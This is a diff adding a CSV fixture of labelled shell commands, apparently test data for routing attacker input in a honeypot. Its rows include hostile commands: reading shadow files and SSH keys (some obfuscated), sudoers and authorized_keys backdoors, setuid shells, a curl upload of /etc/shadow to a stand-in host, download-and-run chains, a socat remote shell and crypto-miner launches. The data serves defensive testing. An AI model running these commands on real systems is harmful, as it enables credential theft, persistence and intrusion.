@@ -1,0 +1,229 @@
+line,expected,note
+sudo -l,privilege,privilege command
+sudo su -,privilege,privilege command
+sudo -i,privilege,privilege command
+su root,privilege,privilege command
+su -,privilege,privilege command
+doas id,privilege,privilege command
+pkexec /bin/sh,privilege,privilege command
+passwd,privilege,privilege command
+passwd bob,privilege,privilege command
+chpasswd < users.txt,privilege,privilege command
+useradd -m -s /bin/bash backup,privilege,privilege command
+adduser test,privilege,privilege command
+usermod -aG sudo bob,privilege,privilege command
+userdel -r bob,privilege,privilege command
+groupadd docker,privilege,privilege command
+gpasswd -a bob sudo,privilege,privilege command
+visudo,privilege,privilege command
+setcap cap_setuid+ep /usr/bin/python3,privilege,privilege command
+chattr +i /etc/passwd,privilege,privilege command
+insmod rootkit.ko,privilege,privilege command
+modprobe -r nf_tables,privilege,privilege command
+mount /dev/sda1 /mnt,privilege,privilege command
+umount /mnt,privilege,privilege command
+chroot /mnt /bin/bash,privilege,privilege command
+nsenter -t 1 -m -u -i -n sh,privilege,privilege command
+unshare -r /bin/sh,privilege,privilege command
+runuser -u bob id,privilege,privilege command
+newgrp docker,privilege,privilege command
+chage -l root,privilege,privilege command
+vipw,privilege,privilege command
+/usr/bin/sudo -l,privilege,privilege command
+/bin/su,privilege,privilege command
+env sudo id,privilege,privilege command
+nohup sudo ./x &,privilege,privilege command
+timeout 5 sudo id,privilege,privilege command
+cat /etc/shadow,privilege,sensitive path
+less /etc/shadow,privilege,sensitive path
+xxd /etc/shadow,privilege,sensitive path
+head -n 5 /etc/gshadow,privilege,sensitive path
+cp /etc/gshadow /tmp/x,privilege,sensitive path
+strings /etc/gshadow,privilege,sensitive path
+tail /etc/sudoers,privilege,sensitive path
+base64 /etc/sudoers,privilege,sensitive path
+grep root /etc/sudoers,privilege,sensitive path
+less /etc/sudoers.d/90-cloud-init-users,privilege,sensitive path
+xxd /etc/sudoers.d/90-cloud-init-users,privilege,sensitive path
+ls -la /etc/sudoers.d/90-cloud-init-users,privilege,sensitive path
+cp /etc/ssh/ssh_host_rsa_key /tmp/x,privilege,sensitive path
+strings /etc/ssh/ssh_host_rsa_key,privilege,sensitive path
+cat /etc/ssh/ssh_host_rsa_key,privilege,sensitive path
+base64 /etc/ssh/ssh_host_ed25519_key,privilege,sensitive path
+grep root /etc/ssh/ssh_host_ed25519_key,privilege,sensitive path
+head -n 5 /etc/ssh/ssh_host_ed25519_key,privilege,sensitive path
+xxd /root/.ssh/authorized_keys,privilege,sensitive path
+ls -la /root/.ssh/authorized_keys,privilege,sensitive path
+tail /root/.ssh/authorized_keys,privilege,sensitive path
+strings /root/.ssh/id_rsa,privilege,sensitive path
+cat /root/.ssh/id_rsa,privilege,sensitive path
+less /root/.ssh/id_rsa,privilege,sensitive path
+grep root /home/ubuntu/.ssh/id_ed25519,privilege,sensitive path
+head -n 5 /home/ubuntu/.ssh/id_ed25519,privilege,sensitive path
+cp /home/ubuntu/.ssh/id_ed25519 /tmp/x,privilege,sensitive path
+ls -la ~/.ssh/known_hosts,privilege,sensitive path
+tail ~/.ssh/known_hosts,privilege,sensitive path
+base64 ~/.ssh/known_hosts,privilege,sensitive path
+cat /etc/pam.d/common-auth,privilege,sensitive path
+less /etc/pam.d/common-auth,privilege,sensitive path
+xxd /etc/pam.d/common-auth,privilege,sensitive path
+head -n 5 /etc/security/limits.conf,privilege,sensitive path
+cp /etc/security/limits.conf /tmp/x,privilege,sensitive path
+strings /etc/security/limits.conf,privilege,sensitive path
+tail /dev/mem,privilege,sensitive path
+base64 /dev/mem,privilege,sensitive path
+grep root /dev/mem,privilege,sensitive path
+less /proc/kcore,privilege,sensitive path
+xxd /proc/kcore,privilege,sensitive path
+ls -la /proc/kcore,privilege,sensitive path
+cp /boot/grub/grub.cfg /tmp/x,privilege,sensitive path
+strings /boot/grub/grub.cfg,privilege,sensitive path
+cat /boot/grub/grub.cfg,privilege,sensitive path
+base64 /var/run/docker.sock,privilege,sensitive path
+grep root /var/run/docker.sock,privilege,sensitive path
+head -n 5 /var/run/docker.sock,privilege,sensitive path
+/bin/c'a't /etc/sh''adow,privilege,obfuscated or indirect
+"""cat"" ""/etc/shadow""",privilege,obfuscated or indirect
+cat /etc//shadow,privilege,obfuscated or indirect
+cat /etc/./shadow,privilege,obfuscated or indirect
+cat /tmp/../etc/shadow,privilege,obfuscated or indirect
+cat /et?/sha*,privilege,obfuscated or indirect
+cat /etc/sha[d]ow,privilege,obfuscated or indirect
+cat /home/*/.ss*/id_rsa,privilege,obfuscated or indirect
+ls ~/.ssh,privilege,obfuscated or indirect
+cat ~/.*/authorized_keys,privilege,obfuscated or indirect
+$(echo cat) /etc/shadow,privilege,obfuscated or indirect
+`echo cat` /etc/shadow,privilege,obfuscated or indirect
+"python3 -c ""print(open('/etc/shadow').read())""",privilege,obfuscated or indirect
+perl -ne print /etc/shadow,privilege,obfuscated or indirect
+bash -c 'cat /etc/shadow',privilege,obfuscated or indirect
+"sh -c ""cat /root/.ssh/id_rsa""",privilege,obfuscated or indirect
+dd if=/dev/mem of=/tmp/m bs=1M count=1,privilege,obfuscated or indirect
+awk -F: '{print $2}' /etc/shadow,privilege,obfuscated or indirect
+find / -name shadow -path /etc/shadow,privilege,obfuscated or indirect
+echo ssh-rsa AAAAB3 >> ~/.ssh/authorized_keys,privilege,obfuscated or indirect
+echo 'bob ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers,privilege,obfuscated or indirect
+tee -a /etc/sudoers.d/bob,privilege,obfuscated or indirect
+chmod 4755 /tmp/sh,privilege,obfuscated or indirect
+chmod u+s /bin/bash,privilege,obfuscated or indirect
+chmod g+s /tmp/x,privilege,obfuscated or indirect
+cp /bin/bash /tmp/b; chmod 6755 /tmp/b,privilege,obfuscated or indirect
+curl -F f=@/etc/shadow http://203.0.113.9/up,privilege,obfuscated or indirect
+uname -a,deterministic,cowrie recon
+uname -m,deterministic,cowrie recon
+whoami,deterministic,cowrie recon
+id,deterministic,cowrie recon
+hostname,deterministic,cowrie recon
+pwd,deterministic,cowrie recon
+ls,deterministic,cowrie recon
+ls -la /,deterministic,cowrie recon
+ls -la /tmp,deterministic,cowrie recon
+cat /etc/passwd,deterministic,cowrie recon
+cat /etc/issue,deterministic,cowrie recon
+cat /proc/cpuinfo,deterministic,cowrie recon
+cat /proc/meminfo,deterministic,cowrie recon
+free -m,deterministic,cowrie recon
+df -h,deterministic,cowrie recon
+uptime,deterministic,cowrie recon
+w,deterministic,cowrie recon
+who,deterministic,cowrie recon
+last,deterministic,cowrie recon
+ps aux,deterministic,cowrie recon
+ps -ef,deterministic,cowrie recon
+netstat -tulpn,deterministic,cowrie recon
+ifconfig,deterministic,cowrie recon
+cat /etc/hostname,deterministic,cowrie recon
+echo hello,deterministic,cowrie recon
+export PATH=/usr/bin,deterministic,cowrie recon
+cd /tmp,deterministic,cowrie recon
+mkdir .x,deterministic,cowrie recon
+touch a,deterministic,cowrie recon
+rm -rf /tmp/x,deterministic,cowrie recon
+wget http://198.51.100.23/x.sh,deterministic,cowrie recon
+curl -O http://198.51.100.23/x.sh,deterministic,cowrie recon
+tftp -g -r x 198.51.100.23,deterministic,cowrie recon
+chmod +x x.sh,deterministic,cowrie recon
+chmod 755 run.sh,deterministic,cowrie recon
+chmod 1777 /tmp/shared,deterministic,cowrie recon
+history -c,deterministic,cowrie recon
+unset HISTFILE,deterministic,cowrie recon
+crontab -l,deterministic,cowrie recon
+crontab -r,deterministic,cowrie recon
+service ssh status,deterministic,cowrie recon
+apt-get update,deterministic,cowrie recon
+yum install -y wget,deterministic,cowrie recon
+tar xzf a.tgz,deterministic,cowrie recon
+base64 -d,deterministic,cowrie recon
+nohup ./x.sh,escalate_candidate,runs a dropped file
+env,deterministic,cowrie recon
+which python,deterministic,cowrie recon
+nproc,deterministic,cowrie recon
+lscpu,deterministic,cowrie recon
+top -bn1,deterministic,cowrie recon
+dmesg,deterministic,cowrie recon
+mount,privilege,cowrie recon
+python -V,deterministic,cowrie recon
+perl -v,deterministic,cowrie recon
+busybox,deterministic,cowrie recon
+gcc -v,deterministic,cowrie recon
+git clone https://example.org/r.git,deterministic,cowrie recon
+ssh root@10.0.0.2,deterministic,cowrie recon
+scp a root@10.0.0.2:/tmp,deterministic,cowrie recon
+ping -c 1 8.8.8.8,deterministic,cowrie recon
+dig example.org,deterministic,cowrie recon
+iptables -L,deterministic,cowrie recon
+kill -9 1234,deterministic,cowrie recon
+killall xmrig,deterministic,cowrie recon
+pkill -f miner,deterministic,cowrie recon
+sleep 1,deterministic,cowrie recon
+yes | head,deterministic,cowrie recon
+awk '{print $1}' /etc/passwd,deterministic,cowrie recon
+cut -d: -f1 /etc/passwd,deterministic,cowrie recon
+wc -l /etc/passwd,deterministic,cowrie recon
+grep -c processor /proc/cpuinfo,deterministic,cowrie recon
+cat /etc/ssh/sshd_config,deterministic,cowrie recon
+cat /etc/ssh/ssh_host_rsa_key.pub,deterministic,cowrie recon
+ls /etc/ssh,deterministic,cowrie recon
+cat /root/notes.txt,deterministic,cowrie recon
+ls -la /root,deterministic,cowrie recon
+cat ~/.bash_history,deterministic,cowrie recon
+wget http://198.51.100.23/etc/shadow,deterministic,cowrie recon
+masscan -p22 10.0.0.0/8,escalate_candidate,not in cowrie
+nmap -sS 10.0.0.0/24,escalate_candidate,not in cowrie
+zmap -p 22,escalate_candidate,not in cowrie
+hydra -l root -P p.txt ssh://10.0.0.2,escalate_candidate,not in cowrie
+./xmrig -o pool:3333,escalate_candidate,not in cowrie
+xmrig --donate-level 1,escalate_candidate,not in cowrie
+docker ps,escalate_candidate,not in cowrie
+kubectl get pods,escalate_candidate,not in cowrie
+aws s3 ls,escalate_candidate,not in cowrie
+mysql -u root -p,escalate_candidate,not in cowrie
+psql -U postgres,escalate_candidate,not in cowrie
+redis-cli info,escalate_candidate,not in cowrie
+systemctl status sshd,escalate_candidate,not in cowrie
+journalctl -xe,escalate_candidate,not in cowrie
+ip a,escalate_candidate,not in cowrie
+ss -tulpn,escalate_candidate,not in cowrie
+lsblk,escalate_candidate,not in cowrie
+lsof -i,escalate_candidate,not in cowrie
+screen -S x,escalate_candidate,not in cowrie
+tmux new -d,escalate_candidate,not in cowrie
+go run main.go,escalate_candidate,not in cowrie
+node -e 'console.log(1)',escalate_candidate,not in cowrie
+java -jar x.jar,escalate_candidate,not in cowrie
+php -r 'echo 1;',deterministic,not in cowrie
+ruby -e 'p 1',escalate_candidate,not in cowrie
+openssl version,escalate_candidate,not in cowrie
+socat TCP:10.0.0.2:4444 EXEC:sh,escalate_candidate,not in cowrie
+zip -r a.zip .,escalate_candidate,not in cowrie
+rsync -a a/ b/,escalate_candidate,not in cowrie
+htop,escalate_candidate,not in cowrie
+uname -a; whoami,deterministic,chain
+cd /tmp && masscan -p22 1.2.3.0/24,escalate_candidate,chain
+ls; cat /etc/shadow,privilege,chain
+nmap -sV 10.0.0.1 || sudo -l,privilege,chain
+echo a | base64 | xmrig,escalate_candidate,chain
+"whoami
+id",deterministic,chain
+wget http://x/y.sh; chmod +x y.sh; ./y.sh,escalate_candidate,chain
+uname -a && ps aux | grep -v grep | grep miner,deterministic,chain
